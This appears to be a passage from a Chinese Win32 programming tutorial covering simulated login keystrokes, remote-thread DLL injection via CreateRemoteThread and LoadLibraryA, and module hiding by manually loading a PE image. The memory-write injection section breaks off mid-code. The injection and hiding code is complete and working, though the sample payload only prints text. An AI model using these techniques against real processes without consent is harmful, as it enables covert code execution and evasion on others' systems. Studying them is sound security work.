class="hljs-comment">//设置鼠标的位置</span><br>::SetCursorPos(r.left+<span class="hljs-number">250</span>,r.top+<span class="hljs-number">120</span>);<br><span class="hljs-comment">//鼠标左键单击</span><br>mouse_event(MOUSEEVENTF_LEFTDOWN,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//点下左键 </span><br>mouse_event(MOUSEEVENTF_LEFTUP,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//松开左键</span><br><span class="hljs-comment">//模拟键盘 输入账号</span><br>keybd_event(<span class="hljs-number">97</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">97</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br><br>keybd_event(<span class="hljs-number">66</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">66</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br><br>keybd_event(<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">67</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">67</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br><br><br><br>Sleep(<span class="hljs-number">1000</span>);<br><span class="hljs-comment">// 按tab</span><br>keybd_event(<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br><span class="hljs-comment">//模拟键盘 输入密码</span><br>keybd_event(<span class="hljs-number">97</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">97</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br><br>keybd_event(<span class="hljs-number">66</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">66</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br><br>keybd_event(<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">67</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">67</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br><br><br><br><span class="hljs-comment">// Enter登录</span><br>keybd_event(<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>keybd_event(<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,KEYEVENTF_KEYUP,<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;  <br>&#125;  <br><br>VOID <span class="hljs-title function_">EnumOpenWindows</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">while</span> (!bFindFlag)<br>&#123;<br>EnumWindows(EnumOpenWindowProc,<span class="hljs-literal">NULL</span>);<br>Sleep(<span class="hljs-number">5000</span>);<br>&#125;<br><br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, _TCHAR* argv[])</span><br>&#123;<br>STARTUPINFO si = &#123;<span class="hljs-number">0</span>&#125;;<br>si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>PROCESS_INFORMATION pi;<br>CreateProcess(path,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,FALSE,CREATE_NEW_CONSOLE,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,&amp;si,&amp;pi);<br>EnumOpenWindows();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h1><p>之前我们是远程创建线程，调用的也是人家自己的线程函数，而如果我们想要创建远程线程调用自己定义的线程函数就需要使用<strong>远程线程注入</strong>技术。</p><h2 id="什么是注入"><a href="#什么是注入" class="headerlink" title="什么是注入"></a>什么是注入</h2><p>所谓注入就是在第三方进程不知道或者不允许的情况下将模块或者代码写入对方进程空间，并设法执行的技术。</p><p>在安全领域，“注入”是非常重要的一种技术手段，注入与反注入也一直处于不断变化的，而且也愈来愈激烈的对抗当中。</p><p><strong>已知的注入方式：</strong></p><p>远程线程注入、APC注入、消息钩子注入、注册表注入、导入表注入、输入法注入等等。</p><h2 id="远程线程注入的流程"><a href="#远程线程注入的流程" class="headerlink" title="远程线程注入的流程"></a>远程线程注入的流程</h2><p>远程线程注入的思路就是在进程A中创建线程，<strong>将线程函数指向LoadLibrary函数</strong>。</p><p>那么为什么可以这样呢？这是因为我们执行远程线程函数满足返回值是4字节，一个参数是4字节即可（ThreadProc就是这样的条件）：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-6-3_15-6-49.png" alt="images/download/attachments/12714992/image2021-6-3_15-6-49.png"></p><p>我们再来看一下<strong>LoadLibrary函数的语法格式</strong>：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">HMODULE LoadLibrary(<br>  LPCTSTR lpFileName   // <span class="hljs-keyword">file</span> <span class="hljs-keyword">name</span> of <span class="hljs-keyword">module</span><br>);<br></code></pre></td></tr></table></figure><p>我们可以跟进（F12）一下<strong>HMODULE和LPCTSTR这两个宏的定义，就会发现其实都是4字节宽度</strong>。</p><p>具体实现步骤如下图所示：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-6-3_15-11-55.png" alt="images/download/attachments/12714992/image2021-6-3_15-11-55.png"></p><h2 id="如何执行代码"><a href="#如何执行代码" class="headerlink" title="如何执行代码"></a>如何执行代码</h2><p>DLL文件，在DLL文件入口函数判断并创建线程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// B.cpp : Defines the entry point for the DLL application.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><br>DWORD WINAPI <span class="hljs-title function_">ThreadProc</span><span class="hljs-params">(LPVOID lpParaneter)</span> &#123;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        Sleep(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DLL RUNNING...&quot;</span>);<br>    &#125;<br>&#125;<br><br>BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">( HANDLE hModule, </span><br><span class="hljs-params">                       DWORD  ul_reason_for_call, </span><br><span class="hljs-params">                       LPVOID lpReserved</span><br><span class="hljs-params">                     )</span><br>&#123;   <span class="hljs-comment">// 当进程执行LoadLibrary时创建一个线程，执行ThreadProc线程</span><br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call) &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>文件我们用如下写的Test.exe即可，将编译好的DLL和Test.exe放在同一个目录并打开Test1.exe。</p><p>注入实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Test.cpp : Defines the entry point for the console application.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;StdAfx.h&quot;</span></span><br><br><span class="hljs-comment">// LoadDll需要两个参数一个参数是进程ID，一个是DLL文件的路径</span><br>BOOL <span class="hljs-title function_">LoadDll</span><span class="hljs-params">(DWORD dwProcessID, <span class="hljs-type">char</span>* szDllPathName)</span> &#123;<br>    <br>    HANDLE hProcess;<br>    HANDLE hThread;<br>    DWORD dwLength;<br>    DWORD dwLoadAddr;<br>    LPVOID lpAllocAddr;<br>    DWORD dwThreadID;<br>    HMODULE hModule;<br>    <br>    bRet = <span class="hljs-number">0</span>;<br>    dwLoadAddr = <span class="hljs-number">0</span>;<br>    hProcess = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 1. 获取进程句柄</span><br>    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID); <br>    <span class="hljs-comment">// 2. 获取DLL文件路径的长度，并在最后+1，因为要加上0结尾的长度</span><br>    dwLength = <span class="hljs-built_in">strlen</span>(szDllPathName) + <span class="hljs-number">1</span>;    <br>    <span class="hljs-comment">// 3. 在目标进程分配内存</span><br>    lpAllocAddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_READWRITE);<br>    <span class="hljs-comment">// 4. 拷贝DLL路径名字到目标进程的内存</span><br>    WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, dwLength, <span class="hljs-literal">NULL</span>);  <br>    <span class="hljs-comment">// 5. 获取模块句柄</span><br>    <span class="hljs-comment">// LoadLibrary这个函数是在kernel32.dll这个模块中的，所以需要现货区kernel32.dll这个模块的句柄</span><br>    hModule = GetModuleHandle(<span class="hljs-string">&quot;kernel32.dll&quot;</span>); <br>    <span class="hljs-comment">// 6. 获取LoadLibraryA函数地址</span><br>    dwLoadAddr = (DWORD)GetProcAddress(hModule, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>); <br>    <span class="hljs-comment">// 7. 创建远程线程，加载DLL</span><br>    hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, <span class="hljs-number">0</span>, &amp;dwThreadID); <br>    <span class="hljs-comment">// 8. 关闭进程句柄</span><br>    CloseHandle(hThread);<br>    CloseHandle(hProcess);<br>    <br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br>    LoadDll(<span class="hljs-number">384</span>, <span class="hljs-string">&quot;C:\\Documents and Settings\\Administrator\\桌面\\test\\B.dll&quot;</span>);<br>    getchar();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注入成功：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-6-3_15-38-24.png" alt="images/download/attachments/12714992/image2021-6-3_15-38-24.png"></p><h1 id="模块隐藏的基本方式"><a href="#模块隐藏的基本方式" class="headerlink" title="模块隐藏的基本方式"></a>模块隐藏的基本方式</h1><h2 id="加载进程"><a href="#加载进程" class="headerlink" title="加载进程"></a>加载进程</h2><p>加载进程的步骤如下：</p><p>1、将自己进程的ImageBase设置一个较大的值，让自己的程序在高空运行.</p><p>2、将要执行的进程读取进来，按照进程的ImageBase和SizeOfImage分配空间</p><p>3、拉伸进程</p><p>4、修复IAT表</p><p>5、跳转到入口执行</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220215110459007.png" alt="加载进程示意图"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br>LPVOID pFileBuffer;<br>LPVOID pImageBuffer;<br>DWORD dwImageSize;<br>HANDLE hCurrentProcess;<br>LPVOID lpAllocAddr;<br><br>PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS pNTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER pPEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER pOptionHeader = <span class="hljs-literal">NULL</span>;<br>LPVOID pImportDir;<br>LPVOID pImportAddressDir;<br><br><br>DWORD dwImageBase;<br>DWORD dwLastError;<br><span class="hljs-comment">// 读取A.exe，拉伸到0x400000中</span><br>ReadPEFile(<span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\injected_exe.exe&quot;</span>, &amp;pFileBuffer);<br>dwImageSize = CopyFileBufferToImageBuffer(pFileBuffer, &amp;pImageBuffer);<br><br><span class="hljs-comment">//更新PE文件信息</span><br>pDosHeader = (PIMAGE_DOS_HEADER) pFileBuffer;<br>pNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pFileBuffer + pDosHeader-&gt;e_lfanew);<br>    pPEHeader = (PIMAGE_FILE_HEADER) (((DWORD) pNTHeader) + <span class="hljs-number">4</span>);<br>    pOptionHeader = (PIMAGE_OPTIONAL_HEADER) ((DWORD) pPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br><br>dwImageBase = pOptionHeader-&gt;ImageBase;<br>pImportAddressDir = (LPVOID)(pOptionHeader-&gt;DataDirectory[<span class="hljs-number">12</span>].VirtualAddress + dwImageBase);<br><br><span class="hljs-comment">// 获取进程自身句柄</span><br>hCurrentProcess = GetCurrentProcess();<br><span class="hljs-comment">// 在进程中申请空间，需要以A.exe的基址来申请</span><br>VirtualAllocEx(hCurrentProcess, (LPVOID)dwImageBase, dwImageSize, MEM_RESET, PAGE_READWRITE);<br>lpAllocAddr = VirtualAllocEx(hCurrentProcess, (LPVOID)dwImageBase, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><br><span class="hljs-keyword">if</span> (lpAllocAddr == <span class="hljs-literal">NULL</span> )<br>&#123;<br>dwLastError = GetLastError();<br>OutputDebugString(<span class="hljs-string">&quot;VirtualAllocEx failed!&quot;</span>);<br>CloseHandle(hCurrentProcess);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (lpAllocAddr != (LPVOID)dwImageBase )<br>&#123;<br>dwLastError = GetLastError();<br>OutputDebugString(<span class="hljs-string">&quot;VirtualAllocEx address inconsist!&quot;</span>);<br>CloseHandle(hCurrentProcess);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// 在进程中写入ImageBuffer</span><br>WriteProcessMemory(hCurrentProcess, lpAllocAddr, pImageBuffer, dwImageSize, <span class="hljs-literal">NULL</span>);<br><br><br><span class="hljs-comment">// 根据A.exe的导入表，修复IAT表</span><br><br>pImportDir = (LPVOID)(pOptionHeader-&gt;DataDirectory[<span class="hljs-number">1</span>].VirtualAddress + dwImageBase);<br><br><span class="hljs-comment">// 解析导入表</span><br>PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) pImportDir;<br><span class="hljs-comment">//遍历数据并找到 IMAGE_IMPORT_DESCRIPTOR 的数目</span><br><span class="hljs-comment">// 检查每一个字节</span><br><span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>BOOL break_flag = FALSE;<br>PIMAGE_IMPORT_DESCRIPTOR pTemp = pImportDescriptor;<br>DWORD procAddress;<br><span class="hljs-keyword">while</span> (pTemp-&gt;Name != <span class="hljs-literal">NULL</span>) &#123;<br>num++;<br>pTemp++;<br>&#125;<br><span class="hljs-comment">// 遍历并处理每一块</span><br>pTemp = pImportDescriptor;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; j++) &#123;<br><span class="hljs-comment">// DLL的名字</span><br><span class="hljs-type">char</span> *dll_name = (<span class="hljs-type">char</span> *) (dwImageBase + (pTemp + j)-&gt;Name);<br><span class="hljs-comment">//printf(&quot;%s :\n&quot;, dll_name);</span><br><span class="hljs-comment">//printf(&quot;----------------------------\n&quot;);</span><br><br><span class="hljs-comment">// INT表</span><br>PIMAGE_THUNK_DATA pThunkName = (PIMAGE_THUNK_DATA) (dwImageBase + (pTemp + j)-&gt;OriginalFirstThunk);<br><span class="hljs-comment">// IAT表</span><br>PIMAGE_THUNK_DATA pThunkProcAddress = (PIMAGE_THUNK_DATA) (dwImageBase + (pTemp + j)-&gt;FirstThunk);<br><br>PIMAGE_IMPORT_BY_NAME pImageImportByName = (PIMAGE_IMPORT_BY_NAME) (dwImageBase + pThunkName-&gt;u1.Ordinal);<br><span class="hljs-comment">// 获取该DLL的函数名或者序号名</span><br><span class="hljs-keyword">while</span> (TRUE) &#123;<br><span class="hljs-keyword">if</span> ((pThunkName-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG) == <span class="hljs-number">0</span>) <span class="hljs-comment">// the highest bit is 0</span><br>&#123; <span class="hljs-comment">// 此时是名称导入方式，需要获取导入DLL中的函数名</span><br>pImageImportByName = (PIMAGE_IMPORT_BY_NAME) (dwImageBase +  pThunkName-&gt;u1.Ordinal);<br><span class="hljs-comment">//printf(&quot;%s\n&quot;, pImageImportByName-&gt;Name);</span><br><span class="hljs-comment">// 得到地址</span><br>procAddress =  (DWORD)GetProcAddress(LoadLibrary(dll_name),pImageImportByName-&gt;Name);<br><br><span class="hljs-comment">// 修复</span><br>pThunkProcAddress-&gt;u1.Ordinal = procAddress;<br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//The highest bit is 1</span><br> <span class="hljs-comment">// 此时是序号导入方式，需要获取导入DLL中的序号</span><br>DWORD dwOrdinal = ((pThunkName-&gt;u1.Ordinal &lt;&lt; <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>);<br><span class="hljs-comment">//printf(&quot;Import by ordinal: %lx\n&quot;, dwOrdinal);</span><br>procAddress = (DWORD)GetProcAddress(LoadLibrary(dll_name),(LPCSTR)dwOrdinal);<br><br><span class="hljs-comment">// 修复</span><br>pThunkProcAddress-&gt;u1.Ordinal = procAddress;<br>&#125;<br>pThunkName++;<br>pThunkProcAddress++;<br><span class="hljs-keyword">if</span> (pThunkName-&gt;u1.Ordinal == <span class="hljs-number">0</span>) &#123; <span class="hljs-keyword">break</span>; &#125;<br>&#125;<br>&#125;<br><br><br><br><span class="hljs-comment">// 跳转到A的入口处执行</span><br>DWORD dwOEPAddr = pOptionHeader-&gt;ImageBase + pOptionHeader-&gt;AddressOfEntryPoint;<br>HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (PTHREAD_START_ROUTINE)dwOEPAddr,<span class="hljs-literal">NULL</span> , <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World\nBelow are the loaded exe:\n&quot;</span>);<br>WaitForSingleObject(hThread, INFINITE);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存写入"><a href="#内存写入" class="headerlink" title="内存写入"></a>内存写入</h2><p>内存写入的思路如下：</p><p>1、获取自身句柄</p><p>2、得到ImageSize的大小,得到模块的ImageBuffer</p><p>3、在当前空间申请空间存放自身代码</p><p>4、拷贝自身到缓存</p><p>5、打开要注入的进程</p><p>6、在远程进程申请空间</p><p>7、对模块中的代码进行重定位</p><p>8、得到模块中要运行的函数的地址</p><p>9、将模块在进程中的地址作为参数传递给入口函数</p><p>10、将修正后的模块 通过WriteProcessMemory写入远程进程的内存空间中</p><p>11、通过CreateRemoteThread启动刚写入的代码</p><p>12、释放内存</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220215112345125.png" alt="内存写入示意图"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><br>LPTSTR lpszCurrentModuleName;<br>LPVOID pFileBuffer;<br>LPVOID pImageBuffer;<br><br>DWORD <span class="hljs-type">static</span> WINAPI <span class="hljs-title function_">Entry</span><span class="hljs-params">(LPVOID pImageBuffer)</span><br>&#123;<br>PIMAGE_DOS_HEADER 